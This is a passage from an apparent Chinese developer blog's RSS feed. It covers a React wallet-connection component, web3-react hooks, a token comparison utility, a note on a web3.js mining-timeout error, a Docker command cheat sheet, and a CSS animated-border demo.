  <span>const</span> <span>disConnect</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>setVisible</span><span>(</span><span>0</span><span>)</span>
    <span>await</span> <span>deactivate</span><span>(</span><span>)</span>
    <span>layout</span><span>(</span><span>)</span>
  <span>}</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span></span><span>></span></span><span>
      </span><span><span><span>&lt;</span>section</span> <span>className</span><span><span>=</span><span>{</span>styles<span>.</span>connect<span>}</span></span><span>></span></span><span>
        </span><span><span><span>&lt;</span><span>Button</span></span>
          <span>loading</span><span><span>=</span><span>{</span>loading<span>}</span></span>
          <span>onClick</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
            <span>if</span> <span>(</span>isLogin<span>)</span> <span>return</span> <span>setVisible</span><span>(</span><span>3</span><span>)</span>
            <span>setVisible</span><span>(</span><span>2</span><span>)</span>
          <span>}</span><span>}</span></span>
          <span>className</span><span><span>=</span><span>{</span>styles<span>.</span>button<span>}</span></span>
        <span>></span></span><span>
          </span><span>{</span>isLogin <span>?</span> <span>(</span>
            <span><span><span>&lt;</span>span</span> <span>className</span><span><span>=</span><span>{</span>styles<span>.</span>address<span>}</span></span><span>></span></span><span>{</span>account<span>}</span><span><span><span>&lt;/</span>span</span><span>></span></span>
          <span>)</span> <span>:</span> <span>(</span>
            <span>formatMessage</span><span>(</span><span>{</span> id<span>:</span> <span>'connect'</span> <span>}</span><span>)</span>
          <span>)</span><span>}</span><span>
        </span><span><span><span>&lt;/</span><span>Button</span></span><span>></span></span><span>
      </span><span><span><span>&lt;/</span>section</span><span>></span></span><span>

      </span><span><span><span>&lt;</span><span>InstallModal</span></span> <span>visible</span><span><span>=</span><span>{</span>visible <span>===</span> <span>1</span><span>}</span></span> <span>hidden</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=></span> <span>setVisible</span><span>(</span><span>0</span><span>)</span><span>}</span></span> <span>/></span></span><span>

      </span><span><span><span>&lt;</span><span>Web3Modal</span></span>
        <span>visible</span><span><span>=</span><span>{</span>visible <span>===</span> <span>2</span><span>}</span></span>
        <span>hidden</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=></span> <span>setVisible</span><span>(</span><span>0</span><span>)</span><span>}</span></span>
        <span>injectedConnect</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=></span> <span>injectedConnect</span><span>(</span><span>false</span><span>)</span><span>}</span></span>
        <span>walletConnect</span><span><span>=</span><span>{</span>walletConnect<span>}</span></span>
      <span>/></span></span><span>

      </span><span><span><span>&lt;</span><span>AccountInfo</span></span>
        <span>visible</span><span><span>=</span><span>{</span>visible <span>===</span> <span>3</span><span>}</span></span>
        <span>hidden</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=></span> <span>setVisible</span><span>(</span><span>0</span><span>)</span><span>}</span></span>
        <span>disConnect</span><span><span>=</span><span>{</span>disConnect<span>}</span></span>
      <span>/></span></span><span>
    </span><span><span><span>&lt;/</span></span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>export</span> <span>default</span> ConnectChain
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br><span>157</span><br><span>158</span><br><span>159</span><br><span>160</span><br><span>161</span><br><span>162</span><br><span>163</span><br><span>164</span><br><span>165</span><br><span>166</span><br><span>167</span><br><span>168</span><br><span>169</span><br><span>170</span><br><span>171</span><br><span>172</span><br><span>173</span><br><span>174</span><br><span>175</span><br><span>176</span><br><span>177</span><br><span>178</span><br><span>179</span><br><span>180</span><br><span>181</span><br><span>182</span><br><span>183</span><br><span>184</span><br><span>185</span><br><span>186</span><br><span>187</span><br><span>188</span><br><span>189</span><br><span>190</span><br><span>191</span><br><span>192</span><br><span>193</span><br><span>194</span><br><span>195</span><br><span>196</span><br><span>197</span><br><span>198</span><br><span>199</span><br><span>200</span><br><span>201</span><br><span>202</span><br><span>203</span><br><span>204</span><br><span>205</span><br><span>206</span><br><span>207</span><br><span>208</span><br><span>209</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>DAPP</title>
      <link>https://www.matrixtheone.ga/web/blockChain/DAPP/</link>
      <guid>https://www.matrixtheone.ga/web/blockChain/DAPP/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">DAPP</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/不能说的秘密.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>Utils</title>
      <link>https://www.matrixtheone.ga/web/blockChain/DAPP/Utils/</link>
      <guid>https://www.matrixtheone.ga/web/blockChain/DAPP/Utils/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Utils</source>
      <category>DAPP</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-comparetoken"> 1. compareToken</h2>
<ul>
<li>判断代币是否足够。</li>
</ul>
<div><pre><code><span>export</span> <span>const</span> <span>compareToken</span> <span>=</span> <span>(</span>a<span>:</span> <span>string</span><span>,</span> b<span>:</span> <span>string</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>a <span>===</span> b<span>)</span> <span>return</span> <span>true</span>
  <span>if</span> <span>(</span>a<span>.</span>length <span>></span> b<span>.</span>length<span>)</span> <span>return</span> <span>true</span>
  <span>if</span> <span>(</span>a<span>.</span>length <span>&lt;</span> b<span>.</span>length<span>)</span> <span>return</span> <span>false</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> a<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>a<span>[</span>i<span>]</span> <span>></span> b<span>[</span>i<span>]</span><span>)</span> <span>return</span> <span>true</span>
    <span>if</span> <span>(</span>a<span>[</span>i<span>]</span> <span>&lt;</span> b<span>[</span>i<span>]</span><span>)</span> <span>return</span> <span>false</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Web3</title>
      <link>https://www.matrixtheone.ga/web/blockChain/DAPP/Web3/</link>
      <guid>https://www.matrixtheone.ga/web/blockChain/DAPP/Web3/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Web3</source>
      <category>DAPP</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-connectors"> 1. connectors</h2>
<div><pre><code><span>import</span> <span>{</span> InjectedConnector <span>}</span> <span>from</span> <span>'@web3-react/injected-connector'</span>
<span>import</span> <span>{</span> WalletConnectConnector <span>}</span> <span>from</span> <span>'@web3-react/walletconnect-connector'</span>

<span>const</span> chainId <span>=</span> <span>parseInt</span><span>(</span>process<span>.</span>env<span>.</span><span>CHAIN</span><span>.</span>chainId<span>)</span>
<span>const</span> rpcURL <span>=</span> process<span>.</span>env<span>.</span><span>CHAIN</span><span>.</span>rpcUrls<span>[</span><span>0</span><span>]</span>

<span>export</span> <span>const</span> injected <span>=</span> <span>new</span> <span>InjectedConnector</span><span>(</span><span>{</span>
  supportedChainIds<span>:</span> <span>[</span>chainId<span>]</span><span>,</span>
<span>}</span><span>)</span>

<span>export</span> <span>const</span> walletconnect <span>=</span> <span>new</span> <span>WalletConnectConnector</span><span>(</span><span>{</span>
  rpc<span>:</span> <span>{</span>
    <span>[</span>chainId<span>]</span><span>:</span> rpcURL<span>,</span>
  <span>}</span><span>,</span>
  qrcode<span>:</span> <span>true</span><span>,</span>
  supportedChainIds<span>:</span> <span>[</span>chainId<span>]</span><span>,</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><h2 id="_2-hooks"> 2. hooks</h2>
<div><pre><code><span>import</span> <span>{</span> useState<span>,</span> useEffect<span>,</span> useRef <span>}</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>{</span> useIntl<span>,</span> useModel <span>}</span> <span>from</span> <span>'umi'</span>
<span>import</span> <span>{</span> useWeb3React<span>,</span> UnsupportedChainIdError <span>}</span> <span>from</span> <span>'@web3-react/core'</span>
<span>import</span> <span>{</span>
  NoEthereumProviderError<span>,</span>
  UserRejectedRequestError <span>as</span> UserRejectedRequestErrorInjected<span>,</span>
<span>}</span> <span>from</span> <span>'@web3-react/injected-connector'</span>
<span>import</span> <span>{</span> UserRejectedRequestError <span>as</span> UserRejectedRequestErrorWalletConnect <span>}</span> <span>from</span> <span>'@web3-react/walletconnect-connector'</span>
<span>import</span> <span>{</span> injected <span>}</span> <span>from</span> <span>'./connectors'</span>
<span>import</span> contractMap <span>from</span> <span>'./contract'</span>
<span>import</span> <span>{</span> notification <span>}</span> <span>from</span> <span>'@/utils'</span>

<span>// 错误提示</span>
<span>export</span> <span>function</span> <span>useErrorMessage</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> formatMessage <span>}</span> <span>=</span> <span>useIntl</span><span>(</span><span>)</span>

  <span>const</span> <span>getErrorMessage</span> <span>=</span> <span>(</span>error<span>:</span> Error<span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>error<span>)</span> <span>return</span>
    <span>if</span> <span>(</span>error <span>instanceof</span> <span>NoEthereumProviderError</span><span>)</span> <span>{</span>
      <span>return</span> <span>formatMessage</span><span>(</span><span>{</span> id<span>:</span> <span>'NoEthereumProviderError'</span> <span>}</span><span>)</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span>error <span>instanceof</span> <span>UnsupportedChainIdError</span><span>)</span> <span>{</span>
      <span>return</span> <span>formatMessage</span><span>(</span><span>{</span> id<span>:</span> <span>'UnsupportedChainIdError'</span> <span>}</span><span>)</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span>
      error <span>instanceof</span> <span>UserRejectedRequestErrorInjected</span> <span>||</span>
      error <span>instanceof</span> <span>UserRejectedRequestErrorWalletConnect</span>
    <span>)</span> <span>{</span>
      <span>return</span> <span>formatMessage</span><span>(</span><span>{</span> id<span>:</span> <span>'UserRejectedRequestError'</span> <span>}</span><span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>return</span> <span>formatMessage</span><span>(</span><span>{</span> id<span>:</span> <span>'UnKnownError'</span> <span>}</span><span>)</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> <span>showErrorMessage</span> <span>=</span> <span>(</span>error<span>:</span> Error<span>)</span> <span>=></span> <span>{</span>
    notification<span>.</span><span>close</span><span>(</span><span>'notification'</span><span>)</span>
    notification<span>.</span><span>warning</span><span>(</span><span>{</span>
      description<span>:</span> <span>getErrorMessage</span><span>(</span>error<span>)</span><span>,</span>
    <span>}</span><span>)</span>
  <span>}</span>

  <span>return</span> showErrorMessage
<span>}</span>

<span>// 若已连接过MetaMask，则进行快速连接</span>
<span>export</span> <span>function</span> <span>useEagerConnect</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> activate<span>,</span> active <span>}</span> <span>=</span> <span>useWeb3React</span><span>(</span><span>)</span>

  <span>const</span> <span>[</span>tried<span>,</span> setTried<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span>

  <span>const</span> showErrorMessage <span>=</span> <span>useErrorMessage</span><span>(</span><span>)</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    injected<span>.</span><span>isAuthorized</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span>isAuthorized <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>isAuthorized<span>)</span> <span>{</span>
        <span>activate</span><span>(</span>injected<span>,</span> <span>undefined</span><span>,</span> <span>true</span><span>)</span><span>.</span><span>catch</span><span>(</span>error <span>=></span> <span>{</span>
          <span>setTried</span><span>(</span><span>true</span><span>)</span>
          <span>showErrorMessage</span><span>(</span>error<span>)</span>
        <span>}</span><span>)</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>setTried</span><span>(</span><span>true</span><span>)</span>
      <span>}</span>
    <span>}</span><span>)</span>
  <span>}</span><span>,</span> <span>[</span><span>]</span><span>)</span> <span>// intentionally only running on mount (make sure it's only mounted once :))</span>

  <span>// if the connection worked, wait until we get confirmation of that to flip the flag</span>
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>tried <span>&amp;&amp;</span> active<span>)</span> <span>{</span>
      <span>setTried</span><span>(</span><span>true</span><span>)</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>tried<span>,</span> active<span>]</span><span>)</span>

  <span>return</span> tried
<span>}</span>

<span>// 监听MetaMask</span>
<span>export</span> <span>function</span> <span>useInactiveListener</span><span>(</span>suppress <span>=</span> <span>false</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> active<span>,</span> error<span>,</span> activate <span>}</span> <span>=</span> <span>useWeb3React</span><span>(</span><span>)</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> <span>{</span> ethereum <span>}</span> <span>=</span> window <span>as</span> <span>any</span>
    <span>if</span> <span>(</span>ethereum <span>&amp;&amp;</span> ethereum<span>.</span>on <span>&amp;&amp;</span> <span>!</span>active <span>&amp;&amp;</span> <span>!</span>error <span>&amp;&amp;</span> <span>!</span>suppress<span>)</span> <span>{</span>
      <span>const</span> <span>handleConnect</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>"Handling 'connect' event"</span><span>)</span>
        <span>activate</span><span>(</span>injected<span>)</span>
      <span>}</span>
      <span>const</span> <span>handleChainChanged</span> <span>=</span> <span>(</span>chainId<span>:</span> <span>number</span> <span>|</span> <span>string</span><span>)</span> <span>=></span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>"Handling 'chainChanged' event with payload"</span><span>,</span> chainId<span>)</span>
        <span>activate</span><span>(</span>injected<span>)</span>
      <span>}</span>
      <span>const</span> <span>handleAccountsChanged</span> <span>=</span> <span>(</span>accounts<span>:</span> <span>string</span><span>[</span><span>]</span><span>)</span> <span>=></span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>"Handling 'accountsChanged' event with payload"</span><span>,</span> accounts<span>)</span>
        <span>if</span> <span>(</span>accounts<span>.</span>length <span>></span> <span>0</span><span>)</span> <span>{</span>
          <span>activate</span><span>(</span>injected<span>)</span>
        <span>}</span>
      <span>}</span>
      <span>const</span> <span>handleNetworkChanged</span> <span>=</span> <span>(</span>networkId<span>:</span> <span>number</span><span>)</span> <span>=></span> <span>{</span>
        <span>console</span><span>.</span><span>log</span><span>(</span><span>"Handling 'networkChanged' event with payload"</span><span>,</span> networkId<span>)</span>
        <span>activate</span><span>(</span>injected<span>)</span>
      <span>}</span>

      ethereum<span>.</span><span>on</span><span>(</span><span>'connect'</span><span>,</span> handleConnect<span>)</span>
      ethereum<span>.</span><span>on</span><span>(</span><span>'chainChanged'</span><span>,</span> handleChainChanged<span>)</span>
      ethereum<span>.</span><span>on</span><span>(</span><span>'accountsChanged'</span><span>,</span> handleAccountsChanged<span>)</span>
      ethereum<span>.</span><span>on</span><span>(</span><span>'networkChanged'</span><span>,</span> handleNetworkChanged<span>)</span>

      <span>return</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        <span>if</span> <span>(</span>ethereum<span>.</span>removeListener<span>)</span> <span>{</span>
          ethereum<span>.</span><span>removeListener</span><span>(</span><span>'connect'</span><span>,</span> handleConnect<span>)</span>
          ethereum<span>.</span><span>removeListener</span><span>(</span><span>'chainChanged'</span><span>,</span> handleChainChanged<span>)</span>
          ethereum<span>.</span><span>removeListener</span><span>(</span><span>'accountsChanged'</span><span>,</span> handleAccountsChanged<span>)</span>
          ethereum<span>.</span><span>removeListener</span><span>(</span><span>'networkChanged'</span><span>,</span> handleNetworkChanged<span>)</span>
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>active<span>,</span> error<span>,</span> suppress<span>,</span> activate<span>]</span><span>)</span>
<span>}</span>

<span>// 实例化合约</span>
<span>export</span> <span>function</span> <span>useContract</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> initialState <span>}</span> <span>=</span> <span>useModel</span><span>(</span><span>'@@initialState'</span><span>)</span>
  <span>const</span> <span>{</span> active<span>,</span> library <span>}</span> <span>=</span> <span>useWeb3React</span><span>(</span><span>)</span>
  <span>const</span> contract <span>=</span> <span>useRef</span><span>(</span><span>null</span><span>)</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>active<span>)</span> <span>{</span>
      contract<span>.</span>current <span>=</span> <span>new</span> <span>library</span><span>.</span>eth<span>.</span><span>Contract</span><span>(</span>
        contractMap<span>[</span>name<span>]</span><span>.</span>abi<span>,</span>
        initialState<span>.</span>config<span>[</span><span><span>`</span><span>Contract</span><span><span>${</span>name<span>}</span></span><span>`</span></span><span>]</span>
      <span>)</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>active<span>,</span> initialState<span>.</span>config<span>]</span><span>)</span>

  <span>return</span> contract
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br></div></div><h2 id="_3-error-transaction-was-not-mined-within-50-blocks"> 3. Error：Transaction was not mined within 50 blocks</h2>
<ul>
<li>
<p>调用主合约合卡前，需将用户选择的卡片授权给主合约，调用授权方法时报此错误。查询无果后，此 DAPP 采用曲线救国方式，当查询到所有卡片已授权为主合约地址时，表示已授权成功（后修改为通过事件监听方式判断是否授权成功）。</p>
</li>
<li>
<p><a href="https://github.com/ChainSafe/web3.js/issues/1102" target="_blank" rel="noopener noreferrer">Transaction was not mined within 50 blocks, please make sure your transaction was properly send. Be aware that it might still be mined!</a></p>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>区块链</title>
      <link>https://www.matrixtheone.ga/web/blockChain/</link>
      <guid>https://www.matrixtheone.ga/web/blockChain/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">区块链</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/黑客帝国.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>Solidity</title>
      <link>https://www.matrixtheone.ga/web/blockChain/Solidity/</link>
      <guid>https://www.matrixtheone.ga/web/blockChain/Solidity/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Solidity</source>
      <category>Solidity</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>Docker</title>
      <link>https://www.matrixtheone.ga/web/command/Docker/</link>
      <guid>https://www.matrixtheone.ga/web/command/Docker/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Docker</source>
      <category>Command</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="reference"> <a href="https://docs.docker.com/reference/" target="_blank" rel="noopener noreferrer">reference</a></h2>
<ul>
<li>
<p><code>docker version</code> 查看 docker 版本信息</p>
</li>
<li>
<p><code>docker info</code> 查看 docker 的系统信息，包含镜像和容器数量</p>
</li>
<li>
<p><code>docker pull 镜像名称:版本</code> 拉取镜像</p>
</li>
<li>
<p><code>docker rmi -f 镜像ID</code> 删除指定镜像</p>
</li>
<li>
<p><code>docker rmi -f 镜像ID 镜像ID</code> 删除多个镜像</p>
</li>
<li>
<p><code>docker rmi -f $(docker images -aq)</code> 删除全部镜像</p>
</li>
<li>
<p><code>docker ps</code> 查看运行中的容器</p>
</li>
<li>
<p><code>docker ps -a</code> 查看包含历史运行过的容器</p>
</li>
<li>
<p><code>docker run tomcat</code> 以 tomcat 镜像运行容器，<code>docker run -it tomcat /bin/bash</code> 运行并进入容器</p>
<blockquote>
<ul>
<li><code>-d</code> 后台方式运行</li>
<li><code>-it</code> 使用交互式运行</li>
<li><code>-p</code> 端口映射，主机端口:容器端口</li>
<li><code>-v</code> 挂载数据卷，主机路径:容器路径</li>
<li><code>-e</code> 环境配置</li>
<li><code>exit</code> 停止运行并退出容器</li>
<li><code>Ctrl + P + Q</code> 不停止运行退出容器</li>
</ul>
</blockquote>
</li>
<li>
<p><code>docker rm 容器ID</code> 删除已停止的容器</p>
</li>
<li>
<p><code>docker rm -f 容器ID</code> 删除运行中/已停止的容器</p>
</li>
<li>
<p><code>docker rm -f $(docker ps -aq)</code> 删除全部容器</p>
</li>
<li>
<p><code>docker ps -a -q|xargs docker rm</code> 删除全部容器</p>
</li>
<li>
<p><code>docker start 容器ID</code> 启动容器</p>
</li>
<li>
<p><code>docker restart 容器ID</code> 重新启动容器</p>
</li>
<li>
<p><code>docker stop 容器ID</code> 停止运行的容器</p>
</li>
<li>
<p><code>docker kill 容器ID</code> 杀死运行的容器</p>
</li>
<li>
<p><code>docker top 容器ID</code> 查看容器中进程的信息</p>
</li>
<li>
<p><code>docker inspect 镜像ID/容器ID</code> 查看镜像/容器的元数据</p>
</li>
<li>
<p><code>docker exec -it 容器ID /bin/bash</code> 进入运行中的容器，开启一个新的终端</p>
</li>
<li>
<p><code>docker attach 容器ID</code> 进入运行中的容器，进入执行中的终端</p>
</li>
<li>
<p><code>docker cp 容器ID:容器路径 主机路径</code> 从容器内拷贝文件到主机上</p>
</li>
<li>
<p><code>docker run -d --name nginx01 -p 主机端口:容器端口 nginx</code> 启动 nginx 容器</p>
</li>
<li>
<p><code>docker run -it -v 主机路径:容器路径 centos /bin/bash</code> 挂载数据卷</p>
</li>
<li>
<p><code>docker volume ls</code> 查看所有数据卷</p>
<blockquote>
<ul>
<li><code>-v 容器路径</code> 匿名挂载</li>
<li><code>-v 卷名:容器路径</code> 具名挂载</li>
<li><code>-v 主机路径:容器路径</code> 指定路径挂载</li>
<li><code>--volume-from 容器</code> 容器数据共享</li>
</ul>
</blockquote>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Blog Home</title>
      <link>https://www.matrixtheone.ga/web/intro/</link>
      <guid>https://www.matrixtheone.ga/web/intro/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Blog Home</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>魔法边框</title>
      <link>https://www.matrixtheone.ga/web/magic/Border/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Border/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">魔法边框</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-639c5f01"
           
  
 

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20width%3A%2050%25%3B%5Cn%20%20height%3A%2050%25%3B%5Cn%20%20border%3A%2010px%20solid%3B%5Cn%20%20border-image%3A%20linear-gradient(45deg%2C%20gold%2C%20deeppink)%201%3B%5Cn%20%20clip-path%3A%20inset(0%20round%2010px)%3B%5Cn%20%20animation%3A%20hue-rotate%203s%20infinite%20linear%3B%5Cn%20%20filter%3A%20hue-rotate(360deg)%3B%5Cn%7D%5Cn%5Cn%40keyframes%20hue-rotate%20%7B%5Cn%20%200%25%20%7B%5Cn%20%20%20%20filter%3A%20hue-rotate(0deg)%3B%5Cn%20%20%7D%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20filter%3A%20hue-rotate(360deg)%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>width</span><span>:</span> 50%<span>;</span>
  <span>height</span><span>:</span> 50%<span>;</span>
  <span>border</span><span>:</span> 10px solid<span>;</span>
